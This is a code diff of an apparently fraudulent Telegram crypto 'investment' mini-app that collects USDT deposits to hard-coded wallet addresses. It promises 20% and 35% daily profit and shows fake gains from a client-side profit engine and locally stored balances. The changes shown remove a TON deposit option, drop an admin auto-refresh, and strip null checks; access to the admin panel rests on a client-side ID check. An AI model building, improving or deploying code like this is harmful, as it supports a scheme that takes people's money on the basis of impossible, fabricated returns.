@@ -240,7 +240,6 @@
             <option value="TRC20">TRON Network (USDT-TRC20)</option>
             <option value="BEP20">BNB Smart Chain (USDT-BEP20)</option>
             <option value="ERC20">Ethereum Network (USDT-ERC20)</option>
-            <option value="TON">TON Network (USDT-TON)</option>
         </select>
 
         <div class="network-preview-card">
@@ -282,7 +281,6 @@
             <option value="TRC20">TRON Network (USDT-TRC20)</option>
             <option value="BEP20">BNB Smart Chain (USDT-BEP20)</option>
             <option value="ERC20">Ethereum Network (USDT-ERC20)</option>
-            <option value="TON">TON Network (USDT-TON)</option>
         </select>
 
         <div class="network-preview-card">
@@ -455,18 +453,13 @@
     </div>
 </section>
 
-<!-- Admin Dashboard Page -->
+<!-- Admin Dashboard Page (Only visible if User ID matches ADMIN_CHAT_ID) -->
 <section id="admin-panel" class="page">
     <div class="card" style="background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px;">
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
-            <h3 style="font-size: 16px; font-weight: 700; color: #f59e0b;">
-                <i class="fa-solid fa-user-shield"></i> Admin Management Panel
-            </h3>
-            <button onclick="forceRefreshAdminPanel()" style="background: rgba(245,158,11,0.15); border: 1px solid rgba(245,158,11,0.3); color: #f59e0b; padding: 4px 10px; border-radius: 6px; font-size: 10px; cursor: pointer; font-weight: 700;">
-                <i class="fa-solid fa-rotate"></i> Refresh
-            </button>
-        </div>
-        <p style="font-size: 11px; color: var(--text-sub); margin-bottom: 14px;">Codsiyada cusub ee ka yimaada app-ka waxay halkan uga soo muuqanayaan si toos ah:</p>
+        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 16px; color: #f59e0b;">
+            <i class="fa-solid fa-user-shield"></i> Admin Management Panel
+        </h3>
+        <p style="font-size: 11px; color: var(--text-sub); margin-bottom: 14px;">Manage pending deposit and withdrawal requests below:</p>
         <div id="admin-pending-container"></div>
     </div>
 </section>
@@ -519,8 +512,7 @@
     const cryptoNetworks = {
         'TRC20': { name: 'Tron TRC20', tag: 'Tether USD (TRC20)', address: 'TLPVBmQnS6VTV7MwzLzYy7EjUKqsKob7hs', icon: 'https://cryptologos.cc/logos/tron-trx-logo.png' },
         'BEP20': { name: 'BNB Smart Chain', tag: 'Tether USD (BEP20)', address: '0xe4484af8794b0fe2eccf433f7da7ac81935fc4a0', icon: 'https://cryptologos.cc/logos/bnb-bnb-logo.png' },
-        'ERC20': { name: 'Ethereum ERC20', tag: 'Tether USD (ERC20)', address: '0xe4484af8794b0fe2eccf433f7da7ac81935fc4a0', icon: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' },
-        'TON': { name: 'TON Network', tag: 'Tether USD (TON)', address: 'EQA000000000000000000000000000000000000000000000', icon: 'https://cryptologos.cc/logos/toncoin-ton-logo.png' }
+        'ERC20': { name: 'Ethereum ERC20', tag: 'Tether USD (ERC20)', address: '0xe4484af8794b0fe2eccf433f7da7ac81935fc4a0', icon: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' }
     };
 
     let activeHistoryFilter = 'all';
@@ -528,10 +520,8 @@
     window.addEventListener('load', () => {
         setTimeout(() => {
             const splash = document.getElementById('splash');
-            if(splash) {
-                splash.style.opacity = '0';
-                splash.style.visibility = 'hidden';
-            }
+            splash.style.opacity = '0';
+            splash.style.visibility = 'hidden';
         }, 1000);
 
         initTelegramUser();
@@ -543,33 +533,10 @@
         updateDepositAddress();
         updateWithdrawIcon();
         checkAdminAccess();
-
-        // Auto-refresh admin view every 3 seconds to keep pending transactions synchronized
-        setInterval(() => {
-            if (telegramUser.id.toString() === ADMIN_CHAT_ID.toString()) {
-                syncAdminState();
-            }
-        }, 3000);
     });
 
     function saveState() {
         localStorage.setItem('usdtpilot_userState', JSON.stringify(userState));
-    }
-
-    function syncAdminState() {
-        let latestState = JSON.parse(localStorage.getItem('usdtpilot_userState'));
-        if (latestState && latestState.transactions) {
-            userState.transactions = latestState.transactions;
-            if (document.getElementById('admin-panel').classList.contains('active')) {
-                renderAdminPendingRequests();
-            }
-        }
-    }
-
-    function forceRefreshAdminPanel() {
-        syncAdminState();
-        renderAdminPendingRequests();
-        showToast("Admin Panel refreshed!");
     }
 
     function initTelegramUser() {
@@ -595,14 +562,13 @@
             document.getElementById('header-avatar').innerHTML = `<img src="${telegramUser.photo_url}" alt="Avatar">`;
             document.getElementById('profile-page-avatar').innerHTML = `<img src="${telegramUser.photo_url}" alt="Avatar">`;
         }
-
-        checkAdminAccess();
     }
 
+    /* ADMIN VERIFICATION & DASHBOARD ENGINE */
     function checkAdminAccess() {
-        if (telegramUser.id.toString() === ADMIN_CHAT_ID.toString()) {
+        if (telegramUser.id.toString() === ADMIN_CHAT_ID) {
             const nav = document.getElementById('main-nav');
-            if (nav && !document.getElementById('admin-nav-btn')) {
+            if (!document.getElementById('admin-nav-btn')) {
                 nav.innerHTML += `
                     <button id="admin-nav-btn" class="nav-btn" onclick="openPage('admin-panel', this)">
                         <i class="fa-solid fa-user-shield" style="color: #f59e0b;"></i> Admin
@@ -617,9 +583,7 @@
         const container = document.getElementById('admin-pending-container');
         if(!container) return;
 
-        // Pull latest state from storage to catch any submissions
-        let latestState = JSON.parse(localStorage.getItem('usdtpilot_userState')) || userState;
-        const pendingTxs = latestState.transactions.filter(t => t.status === 'pending');
+        const pendingTxs = userState.transactions.filter(t => t.status === 'pending');
 
         if (pendingTxs.length === 0) {
             container.innerHTML = `<p style="text-align: center; color: var(--text-sub); font-size: 13px; padding: 20px 0;">No pending requests at the moment.</p>`;
@@ -644,30 +608,28 @@
     }
 
     function processTransaction(txId, action) {
-        let latestState = JSON.parse(localStorage.getItem('usdtpilot_userState')) || userState;
-        const txIndex = latestState.transactions.findIndex(t => t.id === txId);
+        const txIndex = userState.transactions.findIndex(t => t.id === txId);
         if (txIndex === -1) return;
 
-        const tx = latestState.transactions[txIndex];
+        const tx = userState.transactions[txIndex];
 
         if (action === 'approve') {
             tx.status = 'completed';
             if (tx.type === 'deposit') {
-                latestState.balance += tx.amount;
-                latestState.totalDeposited += tx.amount;
+                userState.balance += tx.amount;
+                userState.totalDeposited += tx.amount;
             } else if (tx.type === 'withdraw') {
-                latestState.totalWithdrawn += tx.amount;
+                userState.totalWithdrawn += tx.amount;
             }
             showToast(`Transaction ${txId} APPROVED!`);
         } else if (action === 'reject') {
             tx.status = 'rejected';
             if (tx.type === 'withdraw') {
-                latestState.balance += tx.amount;
+                userState.balance += tx.amount;
             }
             showToast(`Transaction ${txId} REJECTED!`);
         }
 
-        userState = latestState;
         saveState();
         updateUI();
         renderHistory();
@@ -696,39 +658,36 @@
         const stdContainer = document.getElementById('standard-plans');
         const vipContainer = document.getElementById('vip-plans');
 
-        if(stdContainer) {
-            stdContainer.innerHTML = stdAmounts.map(amt => `
-                <div class="plan-card">
-                    <span class="plan-badge badge-std">20% / 24h</span>
-                    <div class="plan-title">$${amt}</div>
-                    <div class="plan-rate">+20% Profit Daily</div>
-                    <div class="plan-info">
-                        <span><i class="fa-regular fa-clock"></i> Profit: Hourly</span>
-                        <span><i class="fa-solid fa-lock"></i> Duration: 7 Days</span>
-                        <span><i class="fa-solid fa-coins"></i> Return: $${(amt * 1.4).toFixed(1)}</span>
-                    </div>
-                    <button class="plan-btn btn-std" onclick="invest(${amt}, 0.20)">Invest Now</button>
+        stdContainer.innerHTML = stdAmounts.map(amt => `
+            <div class="plan-card">
+                <span class="plan-badge badge-std">20% / 24h</span>
+                <div class="plan-title">$${amt}</div>
+                <div class="plan-rate">+20% Profit Daily</div>
+                <div class="plan-info">
+                    <span><i class="fa-regular fa-clock"></i> Profit: Hourly</span>
+                    <span><i class="fa-solid fa-lock"></i> Duration: 7 Days</span>
+                    <span><i class="fa-solid fa-coins"></i> Return: $${(amt * 1.4).toFixed(1)}</span>
                 </div>
-            `).join('');
-        }
+                <button class="plan-btn btn-std" onclick="invest(${amt}, 0.20)">Invest Now</button>
+            </div>
+        `).join('');
 
-        if(vipContainer) {
-            vipContainer.innerHTML = vipAmounts.map(amt => `
-                <div class="plan-card vip-card">
-                    <span class="plan-badge badge-vip">VIP 35%</span>
-                    <div class="plan-title">$${amt}</div>
-                    <div class="plan-rate">+35% Profit Daily</div>
-                    <div class="plan-info">
-                        <span><i class="fa-regular fa-clock"></i> Profit: Hourly</span>
-                        <span><i class="fa-solid fa-lock"></i> Duration: 7 Days</span>
-                        <span><i class="fa-solid fa-coins"></i> Return: $${(amt * 2.45).toFixed(1)}</span>
-                    </div>
-                    <button class="plan-btn btn-vip" onclick="invest(${amt}, 0.35)">Invest VIP</button>
+        vipContainer.innerHTML = vipAmounts.map(amt => `
+            <div class="plan-card vip-card">
+                <span class="plan-badge badge-vip">VIP 35%</span>
+                <div class="plan-title">$${amt}</div>
+                <div class="plan-rate">+35% Profit Daily</div>
+                <div class="plan-info">
+                    <span><i class="fa-regular fa-clock"></i> Profit: Hourly</span>
+                    <span><i class="fa-solid fa-lock"></i> Duration: 7 Days</span>
+                    <span><i class="fa-solid fa-coins"></i> Return: $${(amt * 2.45).toFixed(1)}</span>
                 </div>
-            `).join('');
-        }
+                <button class="plan-btn btn-vip" onclick="invest(${amt}, 0.35)">Invest VIP</button>
+            </div>
+        `).join('');
     }
 
+    // Submit Deposit
     function submitDeposit() {
         const amt = parseFloat(document.getElementById('deposit-amount').value);
         const txid = document.getElementById('deposit-txid').value;
@@ -789,6 +748,7 @@
         openPage('history');
     }
 
+    // Submit Withdraw
     function submitWithdraw() {
         const amt = parseFloat(document.getElementById('withdraw-amount').value);
         const addr = document.getElementById('withdraw-address').value;
@@ -852,6 +812,7 @@
         openPage('history');
     }
 
+    // Invest Action
     function invest(amount, dailyRate) {
         if (userState.balance < amount) {
             showToast("Insufficient Balance! Please deposit first.");
@@ -890,6 +851,7 @@
         showToast(`Successfully invested $${amount}!`);
     }
 
+    // Filter History
     function filterHistory(type, btn) {
         activeHistoryFilter = type;
         document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -897,9 +859,9 @@
         renderHistory();
     }
 
+    // Render History UI
     function renderHistory() {
         const container = document.getElementById('history-container');
-        if(!container) return;
         let filtered = userState.transactions;
 
         if(activeHistoryFilter !== 'all') {
@@ -935,29 +897,24 @@
         }).join('');
     }
 
+    // Update Stats
     function updateStats() {
-        const dElem = document.getElementById('stat-deposits');
-        const wElem = document.getElementById('stat-withdraws');
-        const cElem = document.getElementById('stat-count');
-        const rElem = document.getElementById('stat-roi');
-        const gBar = document.getElementById('goal-bar');
-        const gPct = document.getElementById('goal-percent');
-
-        if(dElem) dElem.innerText = `$${userState.totalDeposited.toFixed(2)}`;
-        if(wElem) wElem.innerText = `$${userState.totalWithdrawn.toFixed(2)}`;
-        if(cElem) cElem.innerText = userState.transactions.length;
+        document.getElementById('stat-deposits').innerText = `$${userState.totalDeposited.toFixed(2)}`;
+        document.getElementById('stat-withdraws').innerText = `$${userState.totalWithdrawn.toFixed(2)}`;
+        document.getElementById('stat-count').innerText = userState.transactions.length;
 
         const roi = userState.totalDeposited > 0 ? ((userState.totalProfit / userState.totalDeposited) * 100).toFixed(1) : '0.0';
-        if(rElem) rElem.innerText = `+${roi}%`;
+        document.getElementById('stat-roi').innerText = `+${roi}%`;
 
         const target = 1000;
         const totalCap = userState.balance + userState.activeInvestment;
         const progress = Math.min((totalCap / target) * 100, 100).toFixed(0);
 
-        if(gBar) gBar.style.width = `${progress}%`;
-        if(gPct) gPct.innerText = `${progress}%`;
+        document.getElementById('goal-bar').style.width = `${progress}%`;
+        document.getElementById('goal-percent').innerText = `${progress}%`;
     }
 
+    // Real-time Profit Engine
     function startProfitEngine() {
         setInterval(() => {
             const now = Date.now();
@@ -988,27 +945,18 @@
     }
 
     function updateUI() {
-        const b = document.getElementById('balance');
-        const p = document.getElementById('profit');
-        const a = document.getElementById('active');
-
-        if(b) b.innerText = userState.balance.toFixed(2);
-        if(p) p.innerText = userState.totalProfit.toFixed(2);
-        if(a) a.innerText = userState.activeInvestment.toFixed(2);
+        document.getElementById('balance').innerText = userState.balance.toFixed(2);
+        document.getElementById('profit').innerText = userState.totalProfit.toFixed(2);
+        document.getElementById('active').innerText = userState.activeInvestment.toFixed(2);
     }
 
     function openPage(pageId, btnElement) {
         document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
-        const targetPage = document.getElementById(pageId);
-        if(targetPage) targetPage.classList.add('active');
+        document.getElementById(pageId).classList.add('active');
 
         if(btnElement) {
             document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
             btnElement.classList.add('active');
-        }
-
-        if(pageId === 'admin-panel') {
-            renderAdminPendingRequests();
         }
     }
 
@@ -1020,11 +968,9 @@
 
     function copyRefLink() {
         const refInput = document.getElementById('ref-link');
-        if(refInput) {
-            refInput.select();
-            navigator.clipboard.writeText(refInput.value);
-            showToast("Referral Link Copied!");
-        }
+        refInput.select();
+        navigator.clipboard.writeText(refInput.value);
+        showToast("Referral Link Copied!");
     }
 
     function sendTicket() {
@@ -1056,7 +1002,6 @@
 
     function showToast(msg) {
         const toast = document.getElementById('toast');
-        if(!toast) return;
         toast.innerText = msg;
         toast.style.display = 'block';
         setTimeout(() => { toast.style.display = 'none'; }, 3000);
